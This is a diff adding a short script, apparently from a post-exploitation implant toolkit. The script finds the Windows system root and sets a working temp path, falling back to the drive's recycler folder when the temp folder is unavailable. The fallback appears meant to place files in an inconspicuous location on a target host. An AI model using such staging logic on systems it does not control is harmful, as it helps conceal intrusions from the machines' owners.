@@ -1,0 +1,48 @@
+### Get system path
+string $systemroot;
+
+@echo off;
+
+@record on;
+ifnot(`lpgetenv -option systemroot`) {
+	`script syspath.eps`;
+	ifnot(`lpgetenv -option systemroot`) {
+		return false;
+	} else {
+		$systemroot=GetCmdData("value");
+	}
+} else {
+	$systemroot=GetCmdData("value");
+}
+string $curpath;
+ifnot (`pwd`) {
+	echo "Could not get current path using pwd.  Continuing, but you may end up in the temp directory.";
+} else {
+	$curpath=GetCmdData("string_val");
+}
+@record off;
+echo "Cur path is $curpath";
+
+# only set if temp path exists
+string $temppath="$systemroot\\temp";
+if (`cd "$temppath"`) {
+	`lpsetenv -option temppath -value "$temppath"`;
+	`cd "$curpath"`;
+	return true;
+} else {
+	# get windows installation drive letter
+	string $sysRootPaths=split("\\",$systemroot);
+	string $driveLetter=$sysRootPaths[0];
+	# if \\temp not valid, try \recycled or \recycler
+	# TODO: incorporate old MakeHomeBase.eps script
+	$temppath="$driveLetter\\recycler";
+	if (`cd "$temppath"`) {
+		`lpsetenv -option temppath -value "$temppath"`;
+		`cd "$curpath"`;
+		return true;
+	}
+}
+
+@echo on;
+
+return false;
